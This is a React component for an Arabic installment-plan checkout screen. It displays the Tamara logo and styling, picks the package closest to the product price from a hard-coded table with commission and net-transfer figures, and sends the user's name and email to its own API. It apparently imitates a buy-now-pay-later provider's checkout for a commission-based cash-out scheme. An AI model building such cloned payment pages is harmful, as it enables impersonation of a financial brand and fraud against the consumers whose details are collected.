import { useState, useMemo, useEffect } from 'react';
import { Button } from '@/components/ui/button';
import { ChevronLeft, ChevronDown, ChevronUp } from 'lucide-react';
import { postCheckoutEvent } from '@/lib/api';
import type { InstallmentPackage } from '../types';

interface SelectPlanProps {
  productPrice: number;
  productName: string;
  userName: string;
  userEmail: string;
  sessionId: string;
  onContinue: (selectedPackage: InstallmentPackage) => void;
  onBack: () => void;
}

interface Package {
  totalAmount: number;
  installmentsCount: number;
  perInstallment: number;
  commission: number;
}

const ALL_PACKAGES: Package[] = [
  // 4 دفعات
  { totalAmount: 4140, installmentsCount: 4, perInstallment: 1035, commission: 210 },
  { totalAmount: 8280, installmentsCount: 4, perInstallment: 2070, commission: 410 },
  { totalAmount: 20700, installmentsCount: 4, perInstallment: 5175, commission: 1040 },
  // 6 دفعات
  { totalAmount: 6210, installmentsCount: 6, perInstallment: 1035, commission: 310 },
  { totalAmount: 12420, installmentsCount: 6, perInstallment: 2070, commission: 620 },
  { totalAmount: 31050, installmentsCount: 6, perInstallment: 5175, commission: 1550 },
  // 24 دفعة
  { totalAmount: 24000, installmentsCount: 24, perInstallment: 1000, commission: 600 },
  // تمارا فقط
  { totalAmount: 50000, installmentsCount: 12, perInstallment: 4166, commission: 1800 },
  { totalAmount: 100000, installmentsCount: 36, perInstallment: 2777, commission: 2200 },
];

const SelectPlan = ({
  productPrice,
  productName,
  userName,
  userEmail,
  sessionId,
  onContinue,
  onBack,
}: SelectPlanProps) => {
  const [showDetails, setShowDetails] = useState(false);

  const formatPrice = (price: number) => {
    return new Intl.NumberFormat('en-US').format(price);
  };

  const closestPackage = useMemo(() => {
    const sorted = [...ALL_PACKAGES].sort((a, b) => {
      const diffA = Math.abs(a.totalAmount - productPrice);
      const diffB = Math.abs(b.totalAmount - productPrice);
      return diffA - diffB;
    });
    return sorted[0];
  }, [productPrice]);

  useEffect(() => {
    if (!closestPackage) return;
    postCheckoutEvent({
      sessionId,
      eventType: 'plan_selected',
      userName,
      userEmail,
      productName,
      productPrice,
      installments: closestPackage.installmentsCount,
      perInstallment: closestPackage.perInstallment,
      commission: closestPackage.commission,
      timestamp: new Date().toISOString(),
    }).catch(() => {});
  }, [sessionId, userName, userEmail, productName, productPrice, closestPackage]);

  const handleContinue = () => {
    if (closestPackage) {
      const installmentPackage: InstallmentPackage = {
        totalAmount: closestPackage.totalAmount,
        installmentsCount: closestPackage.installmentsCount,
        perInstallment: closestPackage.perInstallment,
        commission: closestPackage.commission,
        netTransfer: closestPackage.totalAmount - closestPackage.commission,
      };
      onContinue(installmentPackage);
    }
  };

  const installmentsText = closestPackage
    ? closestPackage.installmentsCount === 1
      ? 'دفعة'
      : 'دفعات'
    : 'دفعات';

  return (
    <div className="min-h-screen bg-white" dir="rtl">
      {/* Header */}
      <div className="bg-white border-b border-gray-200 sticky top-0 z-10">
        <div className="max-w-2xl mx-auto px-4 py-4 flex items-center justify-between">
          <div className="flex items-center gap-3">
            <span className="text-gray-600 text-sm">English</span>
            <span className="text-gray-400">[|]</span>
            <button
              onClick={onBack}
              className="text-gray-500 hover:text-gray-700 transition-colors"
            >
              <span className="text-lg">✕</span>
            </button>
          </div>
          <img
            src="/tamara-logo.webp"
            alt="Tamara"
            className="h-8 object-contain"
          />
        </div>
      </div>

      {/* Content */}
      <div className="max-w-2xl mx-auto px-4 py-6 pb-32">
        {/* Title Section */}
        <div className="mb-8">
          <h1 className="text-[24px] font-bold text-black mb-2">اختر خطتك</h1>
          <p className="text-[14px] text-gray-600">
            حدد طريقة دفعك لـ {formatPrice(productPrice)} ريال
          </p>
        </div>

        {/* Plan Card - Single Package */}
        {closestPackage && (
          <div className="bg-[#f7f3ff] rounded-xl p-5 text-right">
            {/* Header Row */}
            <div className="flex items-center justify-between mb-2">
              <span className="bg-[#ab8dff1a] text-[#5e47b7] px-2 py-1 rounded text-xs font-semibold">
                {closestPackage.installmentsCount} دفعات
              </span>
              <span className="text-black font-semibold text-base">
                ادفع {formatPrice(closestPackage.perInstallment)} ريال اليوم
              </span>
            </div>

            {/* Monthly Payment */}
            <div className="text-black font-semibold text-base mb-3">
              بعدها {formatPrice(closestPackage.perInstallment)} ريال شهريًا
            </div>

            {/* Note */}
            <p className="text-[rgb(82,149,105)] text-xs mb-4">
              هذه الخطة لا تشمل رسوم معالجة!
            </p>

            {/* Circle with number */}
            <div className="flex justify-center mb-4">
              <div className="w-10 h-10 bg-[#9c6af8] rounded-full flex items-center justify-center text-white font-bold text-lg">
                {closestPackage.installmentsCount}
              </div>
            </div>

            {/* Details Button */}
            <button
              onClick={() => setShowDetails(true)}
              className="w-full text-center text-black font-bold py-2"
            >
              عرض التفاصيل
            </button>

            {/* Expanded details - Bottom Sheet */}
            {showDetails && (
              <div className="mt-4 pt-4 border-t border-purple-100 space-y-2">
                <div className="flex items-center justify-between text-gray-700 text-sm">
                  <span>اليوم</span>
                  <span className="font-semibold">{formatPrice(closestPackage.perInstallment)} ريال</span>
                </div>
                {Array.from({ length: closestPackage.installmentsCount - 1 }, (_, i) => (
                  <div key={i} className="flex items-center justify-between text-gray-700 text-sm">
                    <span>الدفعة {i + 1}</span>
                    <span className="font-semibold">{formatPrice(closestPackage.perInstallment)} ريال</span>
                  </div>
                ))}
                <div className="flex items-center justify-between text-black font-bold text-base pt-2 border-t border-purple-100 mt-2">
                  <span>الإجمالي</span>
                  <span>{formatPrice(closestPackage.totalAmount)} ريال</span>
                </div>
              </div>
            )}
          </div>
        )}
      </div>

      {/* Fixed Bottom Button */}
      <div className="fixed bottom-0 left-0 right-0 bg-white border-t border-gray-200 p-4">
        <div className="max-w-2xl mx-auto">
          <Button
            onClick={handleContinue}
            className="w-full py-4 font-bold rounded-[10px] transition-all bg-[#000] hover:bg-gray-800 text-white"
          >
            متابعة الدفع
          </Button>
        </div>
      </div>
    </div>
  );
};

export default SelectPlan;
